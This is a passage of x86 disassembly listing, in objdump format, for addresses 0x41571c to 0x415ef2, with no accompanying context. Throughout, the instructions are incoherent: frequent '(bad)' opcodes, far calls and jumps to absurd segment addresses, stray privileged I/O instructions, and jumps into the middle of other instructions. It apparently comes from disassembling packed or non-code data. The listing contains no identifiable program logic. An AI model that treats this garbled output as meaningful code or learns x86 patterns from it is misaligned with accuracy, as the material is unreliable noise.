  41571c:	xchg   ebx,eax
  41571d:	push   esp
  41571e:	jp     0x415763
  415720:	jmp    0x41579c
  415722:	cli    
  415723:	push   ebx
  415724:	int3   
  415725:	xor    BYTE PTR [esi],dh
  415727:	jnp    0x415791
  415729:	mov    esi,DWORD PTR [ebx]
  41572b:	add    edx,edi
  41572d:	sbb    bh,0xb1
  415730:	and    eax,0x86275d0f
  415735:	inc    eax
  415736:	fidivr WORD PTR [eax+0x5ba7353a]
  41573c:	xchg   ecx,eax
  41573d:	fwait
  41573e:	popa   
  41573f:	fild   DWORD PTR [eax-0x74]
  415742:	jb     0x415706
  415744:	push   ebp
  415745:	adc    DWORD PTR [eax-0x5b],ebx
  415748:	pushf  
  415749:	xchg   edx,eax
  41574a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41574b:	rol    DWORD PTR [edx+0x19],cl
  41574e:	bound  ebx,QWORD PTR [edx+0x711ba865]
  415754:	and    BYTE PTR [eax+0x35],al
  415757:	call   0xd9f0:0x6f4abafe
  41575e:	and    ch,dh
  415760:	call   0xcb5ceb9
  415765:	mov    esi,0x23a77dd4
  41576a:	sbb    esi,DWORD PTR [eax-0x19ffa472]
  415770:	test   al,0x17
  415772:	test   BYTE PTR [edx-0x3a16657],0xe1
  415779:	jg     0x41574d
  41577b:	mov    ebx,0xc16aa1d2
  415780:	and    al,0xa6
  415782:	fild   QWORD PTR [ecx-0x5c33a0a5]
  415788:	sbb    al,0xd8
  41578a:	jmp    0x6ae9:0xac23f87d
  415791:	add    esi,DWORD PTR ds:0xae2cdc41
  415797:	cmp    ebp,DWORD PTR [edi+ebx*8]
  41579a:	jge    0x4157be
  41579c:	ret    
  41579d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41579e:	sub    BYTE PTR [eax],0xfb
  4157a1:	sbb    ebp,edx
  4157a3:	ret    
  4157a4:	aas    
  4157a5:	push   0xff91816f
  4157aa:	hlt    
  4157ab:	xchg   ecx,eax
  4157ac:	test   BYTE PTR [ebx-0x19df4f72],ch
  4157b2:	adc    ah,bl
  4157b4:	mov    edi,0xae94acb
  4157b9:	jns    0x41581b
  4157bb:	out    0x37,al
  4157bd:	mov    eax,0xcd2c3426
  4157c2:	pop    ebx
  4157c3:	or     eax,DWORD PTR [ebp+0x7431e11d]
  4157c9:	push   esi
  4157ca:	in     eax,0xf
  4157cc:	cmp    eax,0x38f94954
  4157d1:	stc    
  4157d2:	push   edi
  4157d3:	mov    dh,0xd5
  4157d5:	add    al,BYTE PTR [edx+0x40bdff6e]
  4157db:	xor    esp,DWORD PTR [ecx]
  4157dd:	(bad)  
  4157de:	arpl   sp,ax
  4157e0:	push   ds
  4157e1:	sub    bl,BYTE PTR [esi+0x42]
  4157e4:	clc    
  4157e5:	stos   BYTE PTR es:[edi],al
  4157e6:	add    DWORD PTR [edi-0x576cb7f4],esi
  4157ec:	fbstp  TBYTE PTR [ebp-0x69]
  4157ef:	mov    bl,0x2b
  4157f1:	push   cs
  4157f2:	rol    DWORD PTR [ecx],cl
  4157f4:	and    al,0x85
  4157f7:	push   eax
  4157f8:	pushf  
  4157f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157fa:	sub    BYTE PTR [ecx+ecx*4-0x38ebad39],bl
  415801:	jecxz  0x415877
  415803:	cmpxchg DWORD PTR [ebx],esi
  415806:	test   DWORD PTR [ebp+esi*8+0x43],esi
  41580a:	or     al,0xed
  41580c:	call   0xc89f1f95
  415811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415812:	enter  0x7857,0x51
  415816:	add    eax,0xf661107
  41581b:	dec    esp
  41581c:	pop    ebx
  41581d:	out    dx,al
  41581e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41581f:	or     BYTE PTR gs:[edx+ebp*1-0x3c79bf3e],0xf9
  415828:	mov    bl,0xf1
  41582a:	dec    esi
  41582b:	rol    DWORD PTR [edx-0x1d],0xe1
  41582f:	mov    bh,0xb3
  415831:	or     ecx,esp
  415833:	ficom  DWORD PTR [esi+edi*8+0x46]
  415837:	imul   ebp,DWORD PTR [esi-0x4fdcc67d],0x69
  41583e:	jns    0x4158a0
  415840:	adc    BYTE PTR ds:0x2ee371e9,0x6e
  415847:	std    
  415848:	jmp    0x4158a5
  41584a:	add    BYTE PTR [ecx+0x6d],al
  41584d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41584e:	imul   esp,DWORD PTR [edx],0xd562c18d
  415854:	adc    esi,ecx
  415856:	push   es
  415857:	push   cs
  415858:	popa   
  415859:	mov    BYTE PTR [ecx],cl
  41585b:	pop    ecx
  41585c:	jno    0x41580e
  41585e:	sbb    al,dh
  415860:	sbb    esp,DWORD PTR [edx]
  415862:	mov    eax,ds:0xe96dbe06
  415867:	(bad)  [esi-0x5aba2429]
  41586d:	sbb    ebp,DWORD PTR [eax]
  41586f:	mov    BYTE PTR [eax+0x13699958],ch
  415875:	jne    0x41586d
  415877:	loop   0x41587e
  415879:	sbb    BYTE PTR ds:0x60dcf5f,ch
  41587f:	call   FWORD PTR [ecx-0x43bc20b5]
  415885:	jo     0x41588d
  415887:	pop    ds
  415888:	or     eax,0x6ab3bda5
  41588d:	test   bh,al
  41588f:	xchg   ecx,eax
  415890:	call   0xf694:0x20afbe11
  415897:	fstp   DWORD PTR [edx]
  415899:	(bad)  
  41589b:	pop    ebx
  41589c:	xchg   ecx,eax
  41589d:	push   esi
  41589e:	cmp    eax,0xd17fe0b7
  4158a3:	push   esp
  4158a4:	(bad)  
  4158a5:	sbb    eax,0x9ee23ce5
  4158aa:	ds inc esi
  4158ac:	mov    dl,0x78
  4158ae:	call   0xa3f9:0x42451b
  4158b5:	mov    ds:0xaeeb7143,eax
  4158ba:	mov    ebx,0xdb3ddda4
  4158bf:	pop    ss
  4158c0:	xchg   ebp,eax
  4158c1:	test   BYTE PTR [edx-0x38],dl
  4158c4:	pop    ecx
  4158c5:	pop    es
  4158c6:	dec    ecx
  4158c7:	jae    0x4158a4
  4158c9:	jp     0x41590a
  4158cb:	mov    ebx,0x1acaa76d
  4158d0:	adc    al,0xfd
  4158d2:	call   0x5746ad82
  4158d7:	in     al,0x7c
  4158d9:	xor    ecx,ecx
  4158db:	inc    edx
  4158dc:	jge    0x41595d
  4158de:	sahf   
  4158df:	les    ecx,FWORD PTR [ecx+edx*1]
  4158e2:	ins    BYTE PTR es:[edi],dx
  4158e3:	lea    esp,[ebx+0x2f2ee865]
  4158e9:	jbe    0x415941
  4158eb:	and    edi,0xcaf7c8b0
  4158f1:	add    DWORD PTR [ebx+0x6adbb997],edx
  4158f7:	or     esi,esi
  4158f9:	fmul   QWORD PTR [ecx-0x78]
  4158fc:	sub    al,0x39
  4158fe:	inc    ebp
  4158ff:	xchg   ebp,eax
  415900:	sub    ch,ch
  415902:	iret   
  415903:	mov    ds:0xa4f910f7,al
  415908:	lea    ebx,[ecx+0x6f2f016b]
  41590e:	mov    ds:0x3a04e243,al
  415913:	cmp    al,0x35
  415915:	add    ebp,DWORD PTR [ebx+eiz*8]
  415918:	test   BYTE PTR [esi-0x3e],al
  41591b:	lods   eax,DWORD PTR ds:[esi]
  41591c:	adc    BYTE PTR [eax],dh
  41591e:	stos   DWORD PTR es:[edi],eax
  41591f:	mov    WORD PTR [edx+ebp*8+0x1346f75f],ss
  415926:	cmp    eax,0x5acefe82
  41592b:	jnp    0x41594b
  41592d:	mov    ebx,0x34e489be
  415932:	inc    ecx
  415933:	stos   BYTE PTR es:[edi],al
  415934:	daa    
  415935:	mov    ebp,0xb67d945b
  41593a:	mov    ebp,0xf0e5a
  41593f:	lock fs fwait
  415942:	nop
  415943:	outs   dx,BYTE PTR ds:[esi]
  415944:	imul   BYTE PTR [ebx-0x57]
  415947:	cmp    al,0xb8
  415949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41594a:	or     ecx,DWORD PTR [esi]
  41594c:	push   esp
  41594d:	sub    al,0x8d
  41594f:	inc    esi
  415950:	jne    0x4159cd
  415952:	or     al,0x30
  415954:	dec    ecx
  415955:	sbb    al,bh
  415957:	aas    
  415958:	and    ebx,ebx
  41595a:	addr16 mov eax,ds:0x4907
  41595e:	fcomip st,st(5)
  415960:	cmp    ebp,esi
  415962:	punpckldq mm3,mm0
  415965:	shr    DWORD PTR [ebx-0x10c1b956],1
  41596b:	lods   al,BYTE PTR ds:[esi]
  41596c:	sub    cl,BYTE PTR [eax]
  41596e:	jl     0x415948
  415970:	popa   
  415971:	jl     0x415985
  415973:	int3   
  415974:	popa   
  415975:	cmp    BYTE PTR [edi+eiz*2-0x4d],dl
  415979:	jmp    0x4e0b:0x5a477cb5
  415980:	mov    ebx,0x40a94607
  415985:	fisttp WORD PTR [ebx]
  415987:	push   eax
  415988:	jbe    0x4159bc
  41598a:	(bad)  
  41598b:	pop    ebp
  41598c:	loopne 0x415945
  41598e:	xlat   BYTE PTR ds:[ebx]
  41598f:	sbb    eax,DWORD PTR [edi]
  415991:	test   BYTE PTR [ecx+edx*2],bh
  415994:	jl     0x41597c
  415996:	js     0x415931
  415998:	sbb    bl,BYTE PTR [eax+0x406e9fdd]
  41599e:	cmp    BYTE PTR [esi],ah
  4159a0:	adc    DWORD PTR [ecx-0x5dc589f7],edi
  4159a6:	out    0xb1,eax
  4159a8:	(bad)  
  4159a9:	xchg   edx,eax
  4159aa:	mov    ebx,0x5f5756f9
  4159af:	adc    DWORD PTR [esi-0x7f0fcccd],ecx
  4159b5:	addr16 leave 
  4159b7:	push   0x679be1eb
  4159bc:	xor    esi,DWORD PTR [esi+0x46045cd4]
  4159c2:	rcl    DWORD PTR [esi],1
  4159c4:	pusha  
  4159c5:	mov    ch,0x34
  4159c7:	cwde   
  4159c8:	add    al,ch
  4159ca:	pop    esp
  4159cb:	adc    BYTE PTR [ebx+0x18],cl
  4159ce:	fcmovbe st,st(2)
  4159d0:	mov    al,0xe3
  4159d2:	mov    bh,0x70
  4159d4:	add    ecx,ecx
  4159d6:	int    0xda
  4159d8:	jnp    0x4159fd
  4159da:	rcr    DWORD PTR [ebx-0x43],cl
  4159dd:	dec    edi
  4159de:	sbb    edi,esp
  4159e0:	mov    ds:0x6cc4af3e,eax
  4159e5:	xor    eax,0x12b97eae
  4159ea:	xchg   ecx,eax
  4159ec:	ins    DWORD PTR es:[edi],dx
  4159ed:	xchg   ebp,eax
  4159ee:	fild   WORD PTR [ebx]
  4159f0:	and    eax,0xb7e595d8
  4159f5:	mov    ds:0xd398c6e6,al
  4159fa:	xchg   BYTE PTR [ebx],al
  4159fc:	fstp   QWORD PTR [esi+edx*8-0x25a2ac80]
  415a03:	ins    BYTE PTR es:[edi],dx
  415a04:	stos   DWORD PTR es:[edi],eax
  415a05:	or     eax,0x8e3627cc
  415a0a:	in     eax,dx
  415a0b:	(bad)  
  415a0c:	in     eax,dx
  415a0d:	pop    edi
  415a0e:	aas    
  415a0f:	test   edx,edx
  415a11:	mov    cs,WORD PTR [edi]
  415a13:	pop    edx
  415a14:	mov    DWORD PTR [ecx+0x55],eax
  415a17:	mov    edx,?
  415a19:	xor    DWORD PTR [eax+0x7f6ba037],edi
  415a1f:	and    DWORD PTR [ebp+0x7f],edx
  415a22:	jge    0x415a49
  415a24:	div    BYTE PTR [ecx+0x14]
  415a27:	lahf   
  415a28:	call   0x365d:0x479b1e86
  415a2f:	mov    edx,0xcd79b73c
  415a34:	inc    ebp
  415a35:	loope  0x415a42
  415a37:	adc    ecx,DWORD PTR [ebx+edx*1+0x2aadd209]
  415a3e:	fimul  DWORD PTR [edx+0x65496d84]
  415a44:	nop
  415a45:	xor    eax,0xce93f102
  415a4a:	adc    eax,0xe8fe94d4
  415a4f:	fwait
  415a50:	xchg   cl,bh
  415a52:	jmp    0x8f61:0x210063ea
  415a59:	pop    ds
  415a5a:	rol    DWORD PTR [edx-0x7f],cl
  415a5d:	cmp    eax,0xf7c9da58
  415a62:	out    dx,al
  415a63:	dec    esi
  415a64:	adc    eax,0xd7d79036
  415a69:	scas   al,BYTE PTR es:[edi]
  415a6a:	aad    0x18
  415a6c:	(bad)  
  415a6d:	int    0xb3
  415a6f:	push   0x57
  415a71:	loope  0x415ac5
  415a73:	rcr    DWORD PTR [ebp+0xc],0xaa
  415a77:	in     eax,dx
  415a78:	jmp    0x415a21
  415a7a:	ret    
  415a7b:	dec    esi
  415a7c:	loop   0x415a38
  415a7e:	icebp  
  415a7f:	sub    ebx,DWORD PTR [edi+ebx*2-0x220644c7]
  415a86:	ds mov esp,0x56a10a80
  415a8c:	(bad)  
  415a8d:	les    ebx,FWORD PTR [ecx+ecx*4-0x74]
  415a91:	pusha  
  415a92:	dec    ecx
  415a93:	mov    BYTE PTR [edi-0x19],ch
  415a96:	mov    ebx,0x33291ee7
  415a9b:	nop
  415a9c:	out    0x6c,al
  415a9e:	std    
  415a9f:	(bad)  
  415aa0:	cli    
  415aa1:	adc    eax,0x413c0515
  415aa6:	clc    
  415aa7:	pusha  
  415aa8:	sub    al,0xa0
  415aaa:	xor    BYTE PTR [ebx],bl
  415aac:	js     0x415ae5
  415aae:	sahf   
  415aaf:	cmc    
  415ab0:	ins    DWORD PTR es:[edi],dx
  415ab1:	in     eax,dx
  415ab2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ab3:	mov    WORD PTR [ecx],es
  415ab5:	dec    BYTE PTR ds:0x641396cd
  415abb:	jno    0x415af9
  415abd:	jl     0x415ab6
  415abf:	mov    edx,0xb4ac6be6
  415ac4:	jns    0x415ad2
  415ac6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ac7:	std    
  415ac8:	push   esi
  415ac9:	int    0x10
  415acb:	or     al,BYTE PTR [ecx]
  415acd:	xor    edx,esi
  415acf:	arpl   WORD PTR [esi+0x2af2f806],cx
  415ad5:	jmp    0x350215cd
  415ada:	sub    cl,dl
  415adc:	xchg   esi,eax
  415add:	pop    ss
  415ade:	xchg   edi,eax
  415adf:	mov    esi,fs
  415ae1:	push   ss
  415ae2:	cmp    DWORD PTR [eax+0x68],esp
  415ae5:	(bad)  
  415ae6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ae7:	int    0x6
  415ae9:	sahf   
  415aea:	repnz mov eax,0x8ee9bd39
  415af0:	loope  0x415a79
  415af2:	add    DWORD PTR [ecx+0x35],ebx
  415af5:	sub    al,0x86
  415af7:	(bad)  
  415af8:	mov    esi,0xbc794a3d
  415afd:	pop    eax
  415afe:	cmp    BYTE PTR [edi],dl
  415b00:	out    0xe2,al
  415b02:	push   cs
  415b03:	hlt    
  415b04:	sub    BYTE PTR [ecx-0x11084354],dl
  415b0a:	mov    ecx,0xa82b9e95
  415b0f:	loope  0x415ae4
  415b11:	jp     0x415b03
  415b13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b14:	cmp    DWORD PTR [ecx-0x23],0x9bba8a26
  415b1b:	push   cs
  415b1c:	add    DWORD PTR [ebp-0x10e341fc],ecx
  415b22:	lock mov ebp,0x12557b0a
  415b28:	aas    
  415b29:	inc    ebp
  415b2a:	fistp  DWORD PTR [edi+0xb2fb2d8]
  415b30:	push   edi
  415b31:	cld    
  415b32:	ja     0x415b04
  415b34:	and    DWORD PTR [ecx],ebx
  415b36:	inc    edi
  415b37:	cmp    eax,0x15c89ae1
  415b3c:	(bad)  
  415b3d:	mov    edx,DWORD PTR [esi]
  415b3f:	pusha  
  415b40:	pop    ds
  415b41:	push   ecx
  415b42:	rcr    DWORD PTR [ebx],cl
  415b44:	nop
  415b45:	es push ebp
  415b47:	jle    0x415b2d
  415b49:	jnp    0x415ae8
  415b4b:	add    DWORD PTR [eax],ebp
  415b4d:	dec    ebx
  415b4e:	repnz jmp FWORD PTR [edx-0x3c]
  415b52:	call   0x9b846cf6
  415b57:	jns    0x415b50
  415b59:	pop    ecx
  415b5a:	sbb    bl,BYTE PTR [edi+edx*1-0xe]
  415b5e:	push   ebx
  415b5f:	(bad)  [ebx]
  415b61:	rol    BYTE PTR [ebp-0x72],cl
  415b64:	inc    esi
  415b65:	dec    esi
  415b66:	lods   al,BYTE PTR ds:[esi]
  415b67:	rol    dl,cl
  415b69:	int3   
  415b6a:	mov    bl,0x51
  415b6c:	jp     0x415b10
  415b6e:	ja     0x415b53
  415b70:	or     eax,0xd816b623
  415b75:	or     al,0x26
  415b77:	popa   
  415b78:	sbb    eax,0x7e521dd9
  415b7d:	mov    eax,0xcb3f09dc
  415b82:	das    
  415b83:	imul   esi,DWORD PTR [edx],0x22
  415b86:	test   eax,0xf191d5a0
  415b8b:	das    
  415b8c:	mov    dh,0xc
  415b8e:	pop    edi
  415b8f:	xor    cl,dl
  415b91:	loope  0x415bd3
  415b93:	in     eax,dx
  415b94:	in     al,dx
  415b95:	xor    BYTE PTR [edx+0x72],bh
  415b98:	inc    DWORD PTR [ecx+eax*2+0x417dca8]
  415b9f:	and    cl,cl
  415ba1:	aaa    
  415ba2:	(bad)  
  415ba3:	clc    
  415ba4:	jne    0x415b80
  415ba6:	sahf   
  415ba7:	and    al,BYTE PTR [edi-0x30e81306]
  415bad:	and    bl,BYTE PTR [edx+edi*4+0x775f889c]
  415bb4:	test   eax,0x84cad158
  415bb9:	jp     0x415b6a
  415bbb:	or     DWORD PTR [ebx],ebx
  415bbd:	pop    edx
  415bbe:	out    dx,al
  415bbf:	xor    eax,DWORD PTR [edx+eax*2]
  415bc2:	dec    ecx
  415bc3:	cmp    BYTE PTR [edx-0x4],0xf
  415bc7:	(bad)  
  415bc8:	retf   
  415bc9:	jo     0x415b65
  415bcb:	imul   edx,DWORD PTR [ebp-0x52],0x520a02f
  415bd2:	scas   eax,DWORD PTR es:[edi]
  415bd3:	mov    ebp,0xb22c0b9
  415bd8:	dec    esi
  415bd9:	mov    esi,0x5348b933
  415bde:	mov    al,0xa4
  415be0:	dec    ebp
  415be1:	cmp    esi,DWORD PTR [ebx-0x21]
  415be4:	retf   
  415be5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415be6:	(bad)  
  415be7:	test   eax,0x3a3d39fb
  415bec:	inc    edi
  415bed:	add    eax,0x43f4a253
  415bf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bf3:	fdiv   QWORD PTR [ebx-0x6d0d8aff]
  415bf9:	lock pop eax
  415bfb:	adc    al,0x53
  415bfd:	in     eax,0xb
  415bff:	mov    esi,ecx
  415c01:	jno    0x415c73
  415c03:	fisub  DWORD PTR [edx]
  415c05:	sub    al,ch
  415c07:	cdq    
  415c08:	sbb    DWORD PTR [ecx+0x5b],ebx
  415c0b:	or     edx,ebp
  415c0d:	lock dec ebx
  415c0f:	mov    ebp,0x3d6665df
  415c14:	pop    esp
  415c15:	dec    ecx
  415c16:	xor    esi,DWORD PTR ss:[esi+0x4e635904]
  415c1d:	and    DWORD PTR [ebp+0x3b10fbd4],esp
  415c23:	inc    edi
  415c24:	mov    bl,0x8a
  415c26:	inc    ebx
  415c27:	xlat   BYTE PTR ds:[ebx]
  415c28:	outs   dx,DWORD PTR ds:[esi]
  415c29:	ret    
  415c2a:	ret    0x2d24
  415c2d:	mov    dl,0xde
  415c2f:	adc    al,bl
  415c31:	push   0x97387bcc
  415c36:	aad    0xed
  415c38:	sub    DWORD PTR cs:[eax],0x30bb653c
  415c3f:	imul   eax,DWORD PTR [eax+0x43e1039c],0x21
  415c46:	pop    esp
  415c47:	(bad)  [esi-0x513a3a27]
  415c4d:	(bad)  
  415c4e:	jno    0x415bf5
  415c50:	repz dec edi
  415c52:	test   eax,0x7428a4a8
  415c57:	imul   ecx,DWORD PTR [edi-0x77f9a3dd],0xfffffff4
  415c5e:	imul   ebx,DWORD PTR cs:[ebx],0x65
  415c62:	dec    eax
  415c63:	repnz mov eax,0xa1f7a772
  415c69:	adc    cl,0xbe
  415c6c:	std    
  415c6d:	scas   al,BYTE PTR es:[edi]
  415c6e:	cmp    DWORD PTR [edi],ebp
  415c70:	inc    eax
  415c71:	das    
  415c72:	mov    bl,0xeb
  415c74:	test   ebp,ebx
  415c76:	jle    0x415cb4
  415c78:	sti    
  415c79:	sub    al,0xe4
  415c7b:	push   ss
  415c7c:	lahf   
  415c7d:	mov    bh,0x8d
  415c7f:	stos   BYTE PTR es:[edi],al
  415c80:	sbb    eax,0x29e1717b
  415c85:	add    eax,0xdda8c6d5
  415c8a:	rol    bh,0xfc
  415c8d:	mov    WORD PTR [esi],?
  415c8f:	gs mov ah,0x30
  415c92:	fmul   QWORD PTR [esi+0xd13cc16]
  415c98:	push   esi
  415c99:	mov    dh,0x31
  415c9b:	xchg   DWORD PTR [ebx],esp
  415c9d:	or     al,0xbc
  415c9f:	sbb    ebp,edx
  415ca1:	cmc    
  415ca2:	sbb    edx,ebx
  415ca4:	and    eax,0xdb257415
  415ca9:	ret    0xab49
  415cac:	xor    eax,0x3f953143
  415cb1:	pop    edi
  415cb2:	xor    BYTE PTR [esi-0x75],bl
  415cb5:	jl     0x415cb5
  415cb7:	push   ebx
  415cb8:	jnp    0x415d32
  415cba:	mov    ebx,0x450a8178
  415cbf:	xlat   BYTE PTR ds:[ebx]
  415cc0:	dec    esp
  415cc1:	jno    0x415cf9
  415cc3:	dec    eax
  415cc4:	xchg   ecx,eax
  415cc5:	in     al,dx
  415cc6:	push   edx
  415cc7:	es jmp 0x5457:0xbce0b49c
  415ccf:	cmp    ebp,DWORD PTR [esi*2-0x1f194cc0]
  415cd6:	push   DWORD PTR [eax-0x4a289eb5]
  415cdc:	push   eax
  415cdd:	(bad)  
  415cde:	test   al,0x59
  415ce0:	xor    ebp,ebp
  415ce2:	sbb    DWORD PTR [ebx-0x5b],edi
  415ce5:	lods   al,BYTE PTR ds:[esi]
  415ce6:	xlat   BYTE PTR ds:[ebx]
  415ce7:	or     al,0xc5
  415ce9:	aam    0x62
  415ceb:	dec    eax
  415cec:	stos   BYTE PTR es:[edi],al
  415ced:	jg     0x415cf6
  415cef:	adc    al,0x27
  415cf1:	out    0x11,al
  415cf3:	xor    al,0xa2
  415cf5:	in     al,dx
  415cf6:	sub    al,0xfa
  415cf8:	jns    0x415d24
  415cfa:	pop    ebp
  415cfb:	push   ss
  415cfc:	push   0x57
  415cfe:	dec    esi
  415cff:	test   DWORD PTR [ecx+esi*4-0x4673e58a],edx
  415d06:	mov    bh,0x3f
  415d08:	mov    ecx,0xd0ea8eee
  415d0d:	adc    eax,0x4da80fc7
  415d12:	mov    edi,0x2322653f
  415d17:	fisttp DWORD PTR [ebx-0x2b9dfba]
  415d1d:	fistp  QWORD PTR [ebp+0x5495608c]
  415d23:	call   0x9097275c
  415d28:	and    al,ah
  415d2a:	or     eax,esp
  415d2c:	pusha  
  415d2d:	or     eax,0xef9e19b5
  415d32:	inc    esp
  415d33:	xchg   ecx,eax
  415d34:	sub    al,0xb3
  415d36:	jle    0x415d8e
  415d38:	or     eax,0x9aa60a9e
  415d3d:	and    al,bh
  415d3f:	mov    al,0x34
  415d41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d42:	fist   WORD PTR [edi+ebx*4-0x37]
  415d46:	mov    esp,0x4421da61
  415d4b:	cwde   
  415d4c:	push   ebx
  415d4d:	dec    eax
  415d4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d4f:	xor    ecx,DWORD PTR [ebx+0x47]
  415d52:	movups xmm4,XMMWORD PTR [eax-0x4e]
  415d56:	fist   WORD PTR [edi+0x3b]
  415d59:	xchg   DWORD PTR [esi],edi
  415d5b:	fimul  DWORD PTR [ebx-0x42b05e4f]
  415d61:	(bad)  
  415d62:	mov    ebp,0x636ff706
  415d67:	and    eax,0x2ad5354c
  415d6c:	std    
  415d6d:	lahf   
  415d6e:	addr16 pushf 
  415d70:	ins    BYTE PTR es:[edi],dx
  415d71:	rol    edi,0xbc
  415d74:	mov    dl,0x42
  415d76:	enter  0xcca5,0xc3
  415d7a:	ror    BYTE PTR [eax+0x70244d02],cl
  415d80:	fimul  WORD PTR [edx+0x6e]
  415d83:	fist   WORD PTR [ebp-0x57060ba9]
  415d89:	pop    ss
  415d8a:	cwde   
  415d8b:	xchg   ebx,eax
  415d8c:	mov    dl,0x1f
  415d8e:	jb     0x415dcf
  415d90:	aam    0xf3
  415d92:	daa    
  415d93:	ds je  0x415dc0
  415d96:	ja     0x415de5
  415d98:	fild   QWORD PTR [edx]
  415d9a:	dec    edi
  415d9b:	pusha  
  415d9c:	lods   eax,DWORD PTR ds:[esi]
  415d9d:	inc    eax
  415d9e:	iret   
  415d9f:	sub    al,0x77
  415da1:	aas    
  415da2:	mov    es,WORD PTR [edi+0xd]
  415da5:	sbb    BYTE PTR [ebx-0xa5dae9],bh
  415dab:	push   cs
  415dac:	js     0x415d61
  415dae:	mov    ecx,0x6239550c
  415db3:	lahf   
  415db4:	dec    ebx
  415db5:	leave  
  415db6:	push   0xffffffc4
  415db8:	daa    
  415db9:	lds    edx,FWORD PTR [esi]
  415dbb:	mov    DWORD PTR [ecx-0x420bd80c],ecx
  415dc1:	out    dx,al
  415dc2:	test   al,0xb9
  415dc4:	cmp    ch,bl
  415dc6:	and    bh,BYTE PTR [edx+0x6b]
  415dc9:	(bad)  
  415dca:	out    dx,eax
  415dcb:	sub    cl,BYTE PTR [ebx+0x653c6590]
  415dd1:	in     al,0x64
  415dd3:	jle    0x415e50
  415dd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dd6:	adc    esi,ebx
  415dd8:	jg     0x415e3c
  415dda:	cmp    esp,DWORD PTR [ecx-0x9]
  415ddd:	push   ebp
  415dde:	cmp    dh,BYTE PTR [edx-0x53b0d730]
  415de4:	imul   ebx,edx,0xb5f14dc3
  415dea:	mov    al,0xa8
  415dec:	cwde   
  415ded:	inc    ebp
  415dee:	retf   0x3a0f
  415df1:	popf   
  415df2:	aas    
  415df3:	(bad)  
  415df4:	mov    esp,0x1df6b2de
  415df9:	or     bh,bl
  415dfb:	mov    dh,0x76
  415dfd:	mov    ecx,0x188923b7
  415e02:	mov    ebx,fs
  415e04:	dec    ebp
  415e05:	repz inc eax
  415e07:	loopne 0x415e86
  415e09:	lock dec edx
  415e0b:	popa   
  415e0c:	add    al,0xc1
  415e0e:	or     DWORD PTR [eax],eax
  415e10:	repnz stos DWORD PTR es:[edi],eax
  415e12:	fs jb  0x415e1f
  415e15:	shl    DWORD PTR [eax-0x4b],1
  415e18:	mov    ch,0x3f
  415e1a:	pop    esi
  415e1b:	inc    edi
  415e1c:	(bad)  
  415e1d:	rcr    DWORD PTR [ebp-0x51],1
  415e20:	mov    eax,0x228a4f90
  415e25:	xor    BYTE PTR [ebx+0x1fdae7f4],bh
  415e2b:	mov    ecx,esi
  415e2d:	ja     0x415db5
  415e2f:	and    ebp,DWORD PTR [edi+0x3efad788]
  415e35:	arpl   WORD PTR [edi+0x82fef12],sp
  415e3b:	xchg   ebp,eax
  415e3c:	push   eax
  415e3d:	repz jge 0x415dcf
  415e40:	sub    al,BYTE PTR [esi+0x63]
  415e43:	mov    ah,0x0
  415e45:	ss pop esi
  415e47:	lea    esp,[ecx-0x7f]
  415e4a:	ja     0x415eae
  415e4c:	push   ss
  415e4d:	popa   
  415e4e:	mov    ecx,esp
  415e50:	jmp    0x415ed0
  415e52:	inc    esp
  415e53:	loope  0x415e1f
  415e55:	lahf   
  415e56:	inc    edi
  415e57:	inc    ecx
  415e58:	mov    ebp,0xcb9f0e07
  415e5d:	je     0x415e88
  415e5f:	or     ecx,DWORD PTR [ebx*8+0x5cc9c224]
  415e66:	es mov cl,0x57
  415e69:	mov    DWORD PTR [esi+0x6fc50644],eax
  415e6f:	out    dx,al
  415e70:	mov    eax,0xe62807ef
  415e75:	pop    ebx
  415e76:	adc    BYTE PTR [ebp+eiz*8+0x6],0xe2
  415e7b:	xor    al,0x7b
  415e7d:	lock ret 
  415e7f:	adc    DWORD PTR gs:[edi+0x36bad8ab],ebp
  415e86:	jns    0x415ed0
  415e88:	xlat   BYTE PTR ds:[ebx]
  415e89:	add    DWORD PTR [ebx-0xc],eax
  415e8c:	sbb    ecx,eax
  415e8e:	test   eax,0x48b01ca2
  415e93:	adc    BYTE PTR [ecx-0x4b],dh
  415e96:	mov    bl,0xa4
  415e98:	nop
  415e99:	cli    
  415e9a:	mov    ebp,0xd858d3d7
  415e9f:	adc    DWORD PTR [edx+0x2932008a],edx
  415ea5:	xor    al,0x30
  415ea7:	aas    
  415ea8:	icebp  
  415ea9:	scas   al,BYTE PTR es:[edi]
  415eaa:	jbe    0x415ed2
  415eac:	dec    esp
  415ead:	and    BYTE PTR [edx+0x1272a798],bl
  415eb3:	jp     0x415ed8
  415eb5:	mov    cl,0x95
  415eb7:	cmc    
  415eb8:	ss xchg edx,eax
  415eba:	lock push ds
  415ebc:	push   esp
  415ebd:	fidiv  DWORD PTR [eax-0x5b]
  415ec0:	push   edx
  415ec1:	aas    
  415ec2:	inc    ecx
  415ec3:	sub    al,0x98
  415ec5:	xchg   ebp,eax
  415ec6:	lods   al,BYTE PTR ds:[esi]
  415ec7:	jbe    0x415e80
  415ec9:	aad    0x4b
  415ecb:	icebp  
  415ecc:	pop    edx
  415ecd:	shl    DWORD PTR [ebp*1-0x52eba032],cl
  415ed4:	jge    0x415e7c
  415ed6:	pop    edi
  415ed7:	adc    edx,DWORD PTR [edi]
  415ed9:	mov    ecx,esp
  415edb:	sub    eax,edx
  415edd:	push   edx
  415ede:	push   esi
  415edf:	jo     0x415ebb
  415ee1:	xor    eax,0x2072d7e7
  415ee6:	icebp  
  415ee7:	mov    DWORD PTR cs:[esi-0x6d37fca3],0x7143dea1
  415ef2:	sub    eax,0x153f3420
